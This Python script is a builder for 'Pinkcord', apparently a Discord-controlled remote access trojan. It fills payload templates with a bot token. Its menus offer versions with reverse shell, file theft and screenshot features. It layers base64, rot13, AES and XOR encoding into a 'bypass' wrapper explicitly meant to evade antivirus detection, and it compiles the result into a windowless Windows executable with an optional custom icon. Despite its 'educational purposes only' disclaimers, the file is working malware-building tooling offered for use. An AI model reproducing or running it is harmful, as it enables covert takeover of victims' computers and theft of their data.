import subprocess
import sys
import codecs
import base64
import platform
import os
import string
import secrets
import random

TOKEN_FILE = 'template/pinkcord.py'
TOKEN_FILE_MINIMAL = 'template/pinkcord_minimal.py'
TOKEN_FILE_LITE = 'template/pinkcord_lite.py'
BYPASS_FILE = 'template/pinkcord_bypass.py'
BYPASS_FILE_MINIMAL = 'template/pinkcord_minimal_bypass.py'
BYPASS_FILE_LITE = 'template/pinkcord_lite_bypass.py'
AES_KEY_FILE = 'AES_KEY.txt'
DIST_FOLDER = 'dist'
COLOR_RESET = "\033[0m"
GREEN_COLOR = "\033[32m"
YELLOW_COLOR = "\033[33m"
RED_COLOR = "\033[31m"
versions = ["pinkcord.py", "pinkcord_minimal.py", "pinkcord_lite.py"]
versions_descriptions = ["it has all the features but antiviruses often detect it", "the minimal version, the hardest to detect, has only reverse shell functions", "has everything that the minimum version has, but unlike it, it can upload files and steal them, it has the function of taking screenshots, it can be slightly more detected by antiviruses"]

asciart = "\033[95m" + '''
  _____ _____ _   _ _  _______ ____  _____  _____  
 |  __ \_   _| \ | | |/ / ____/ __ \|  __ \|  __ \ 
 | |__) || | |  \| | ' / |   | |  | | |__) | |  | |
 |  ___/ | | | . ` |  <| |   | |  | |  _  /| |  | |
 | |    _| |_| |\  | . \ |___| |__| | | \ \| |__| |
 |_|   |_____|_| \_|_|\_\_____\____/|_|  \_\_____/ 

https://github.com/xanonDev/pinkcord
[!] some functions may not work on linux, so I recommend using windows to run this script
''' + COLOR_RESET


def clear_console():
    if platform.system() == 'Windows':
        os.system('cls')
    else:
        os.system('clear')

def genpinkcordminimal():
    print(YELLOW_COLOR + 'Replacing the token in the pinkcord_minimal.py file....' + COLOR_RESET)
    with open(TOKEN_FILE_MINIMAL, 'r') as sc:
        content = sc.read()
        content = content.replace("<TOKEN>", token)
    with open("pinkcord.py", 'w') as sc:
        sc.write(content)
    clear_console()
    print(asciart)
    print('Do you want to test Pinkcord by running it?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    clear_console()
    print(asciart)
    if answer == "1":
        if platform.system() == 'Windows':
            subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
        else:
            subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
        print(YELLOW_COLOR + 'Send !h to your Discord bot. If it responds, it means it\'s working')
        print('If it doesn\'t respond, press ENTER in the new window and try again' + COLOR_RESET)
        input(GREEN_COLOR + 'Press ENTER when you finish testing' + COLOR_RESET)
    clear_console()
    print(asciart)
    print("do you want to set a custom icon for your Pinkcord?")
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        icon = input("enter the path to your .ico file: ")
    clear_console()
    print(asciart)
    print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
        with open("pinkcord.py", 'r') as sourcecode:
            sourcecode = sourcecode.read()
            sourcecode = sourcecode.encode('utf-8')
            sourcecode = base64.b64encode(sourcecode)
            sourcecode = sourcecode.decode('utf-8')
            sourcecode = codecs.decode(sourcecode, 'rot13')
        print(GREEN_COLOR + "[*] encoded" + COLOR_RESET)
        print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
        with open(BYPASS_FILE_MINIMAL, 'r') as bypass:
            content = bypass.read()
            content = content.replace("<BYPASS>", sourcecode)
        with open("pinkcord_bypass.py", 'w') as bypass:
            bypass.write(content)
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord_bypass.py"
            ]
        else: 
            params = [
                '--onefile',
                '--windowed',
                "pinkcord_bypass.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord_bypass.exe"
        print(GREEN_COLOR + f"[*] pinkcord_bypass.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember, this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
    else:
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord.py"
            ]
        else:
            params = [
                '--onefile',
                '--windowed',
                "pinkcord.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord.exe"
        print(GREEN_COLOR + f"[*] pinkcord.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)

def genpinkcordlite():
    print(YELLOW_COLOR + 'Replacing the token in the pinkcord_minimal.py file....' + COLOR_RESET)
    with open(TOKEN_FILE_LITE, 'r') as sc:
        content = sc.read()
        content = content.replace("<TOKEN>", token)
    with open("pinkcord.py", 'w') as sc:
        sc.write(content)
    clear_console()
    print(asciart)
    print('Do you want to test Pinkcord by running it?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    clear_console()
    print(asciart)
    if answer == "1":
        if platform.system() == 'Windows':
            subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
        else:
            subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
        print(YELLOW_COLOR + 'Send !h to your Discord bot. If it responds, it means it\'s working')
        print('If it doesn\'t respond, press ENTER in the new window and try again' + COLOR_RESET)
        input(GREEN_COLOR + 'Press ENTER when you finish testing' + COLOR_RESET)
    clear_console()
    print(asciart)
    print("do you want to set a custom icon for your Pinkcord?")
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        icon = input("enter the path to your .ico file: ")
    clear_console()
    print(asciart)
    print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
        with open("pinkcord.py", 'r') as sourcecode:
            sourcecode = sourcecode.read()
            sourcecode = sourcecode.encode('utf-8')
            sourcecode = base64.b64encode(sourcecode)
            sourcecode = sourcecode.decode('utf-8')
            sourcecode = codecs.decode(sourcecode, 'rot13')
        print(GREEN_COLOR + "[*] encoded" + COLOR_RESET)
        print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
        with open(BYPASS_FILE_LITE, 'r') as bypass:
            content = bypass.read()
            content = content.replace("<BYPASS>", sourcecode)
        with open("pinkcord_bypass.py", 'w') as bypass:
            bypass.write(content)
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord_bypass.py"
            ]
        else: 
            params = [
                '--onefile',
                '--windowed',
                "pinkcord_bypass.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord_bypass.exe"
        print(GREEN_COLOR + f"[*] pinkcord_bypass.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember, this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
    else:
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord.py"
            ]
        else:
            params = [
                '--onefile',
                '--windowed',
                "pinkcord.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord.exe"
        print(GREEN_COLOR + f"[*] pinkcord.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)

def genpinkcord():
    print(YELLOW_COLOR + 'Replacing the token in the pinkcord.py file....' + COLOR_RESET)
    with open(TOKEN_FILE, 'r') as sc:
        content = sc.read()
        content = content.replace("<TOKEN>", token)
    with open("pinkcord.py", 'w') as sc:
        sc.write(content)
    clear_console()
    print(asciart)
    print('Do you want to test Pinkcord by running it?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    clear_console()
    print(asciart)
    if answer == "1":
        if platform.system() == 'Windows':
            subprocess.Popen(['start', 'cmd', '/k', 'py', 'pinkcord.py'], shell=True)
        else:
            subprocess.Popen(['xterm', '-e', 'python', 'pinkcord.py'])
        print(YELLOW_COLOR + 'Send !h to your Discord bot. If it responds, it means it\'s working')
        print('If it doesn\'t respond, press ENTER in the new window and try again' + COLOR_RESET)
        input(GREEN_COLOR + 'Press ENTER when you finish testing' + COLOR_RESET)
    clear_console()
    print(asciart)
    print("do you want to set a custom icon for your Pinkcord?")
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        icon = input("enter the path to your .ico file: ")
    clear_console()
    print(asciart)
    print('Do you want to encode Pinkcord to make it undetectable by antivirus software and harder to decompile?')
    print(GREEN_COLOR + '1. Yes' + COLOR_RESET)
    print(RED_COLOR + '2. No' + COLOR_RESET)
    answer = input("Choice: ")
    if answer == "1":
        from Cryptodome.Cipher import AES
        from Cryptodome.Random import get_random_bytes
        from Cryptodome.Protocol.KDF import PBKDF2
        from Cryptodome.Util.Padding import pad, unpad
        def encrypt_code_AES(text, key):
            cipher = AES.new(key, AES.MODE_CBC)
            ciphertext = cipher.encrypt(pad(text.encode(), AES.block_size))
            return base64.b64encode(cipher.iv + ciphertext).decode()
        def text_to_xor(text, key):
            xor_result = []
            for char in text:
                xor_result.append(ord(char) ^ key)
            return xor_result
        print(YELLOW_COLOR + 'Encoding Pinkcord...' + COLOR_RESET)
        with open("pinkcord.py", 'r') as sourcecode:
            sourcecode = sourcecode.read()
            sourcecode = sourcecode.encode('utf-8')
            sourcecode = base64.b64encode(sourcecode)
            sourcecode = sourcecode.decode('utf-8')
            sourcecode = codecs.decode(sourcecode, 'rot13')
            salt = get_random_bytes(32)
            salt = get_random_bytes(32)
            chars = string.ascii_letters + string.digits + string.punctuation
            length = 10000
            password = ''.join(secrets.choice(chars) for _ in range(length))
            key = PBKDF2(password.encode(), salt, dkLen=32, count=1000000)
            sourcecode = encrypt_code_AES(sourcecode, key)
            sourcecode = codecs.decode(sourcecode, 'rot13')
            xorkey = random.randint(0, 255)
            sourcecode = str(text_to_xor(sourcecode, xorkey))
            with open("AES_KEY.txt", "wb") as f:
                    f.write(base64.b64encode(key))
            with open("XOR_KEY.txt", "w") as f:
                    f.write(str(xorkey))
        print(GREEN_COLOR + "[*] encoded" + COLOR_RESET)
        print(YELLOW_COLOR + "Creating a bypass script..." + COLOR_RESET)
        with open(BYPASS_FILE, 'r') as bypass:
            content = bypass.read()
            content = content.replace("<BYPASS>", sourcecode)
            with open(AES_KEY_FILE, 'r') as key:
                content = content.replace("<BYPASS_KEY>", key.read())
                with open("XOR_KEY.txt", "r") as xorkey:
                    content = content.replace("<XORKEY>", xorkey.read())

        with open("pinkcord_bypass.py", 'w') as bypass:
            bypass.write(content)
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord_bypass.py"
            ]
        else: 
            params = [
                '--onefile',
                '--windowed',
                "pinkcord_bypass.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord_bypass.exe"
        print(GREEN_COLOR + f"[*] pinkcord_bypass.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember, this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)
    else:
        clear_console()
        print(asciart)
        import PyInstaller.__main__
        print(GREEN_COLOR + "Generating exe file...")
        if "icon" in globals():
            params = [
                '--onefile',
                '--windowed',
                f'--icon={icon}',
                "pinkcord.py"
            ]
        else:
            params = [
                '--onefile',
                '--windowed',
                "pinkcord.py"
            ]
        PyInstaller.__main__.run(params)
        clear_console()
        print(asciart)
        path = "dist/pinkcord.exe"
        print(GREEN_COLOR + f"[*] pinkcord.exe generated ({os.path.getsize(path)} bytes) in the {DIST_FOLDER} folder" + COLOR_RESET)
        print("\033[31m" + "[!] Remember this program is for educational purposes only and should not be used for illegal activities" + COLOR_RESET)

clear_console()
print(asciart)
print(YELLOW_COLOR + "Installing required libraries..." + COLOR_RESET)
subprocess.check_call([sys.executable, '-m', 'pip', 'install', '-r', 'requirements.txt'])
clear_console()
print(asciart)
print(GREEN_COLOR + "Libraries installed[*]" + COLOR_RESET)
token = input("Enter your Discord bot token: ")
print(YELLOW_COLOR + "Encoding token..." + COLOR_RESET)
token = token.encode('utf-8')
token = base64.b64encode(token)
token = base64.b32encode(token)
token = token.decode('utf-8')
token = codecs.encode(token, 'rot13')
print(GREEN_COLOR + "Token encoded[*]" + COLOR_RESET)
clear_console()
print(asciart)
print("choise pinkcord version:")
count = 0
for version in versions:
    print(f"{GREEN_COLOR}{count}. {version} - {versions_descriptions[count]}{COLOR_RESET}")
    count = count + 1
version = input("Choice: ")
if version == "0":
    genpinkcord()
elif version == "1":
    genpinkcordminimal()
elif version == "2":
    genpinkcordlite()
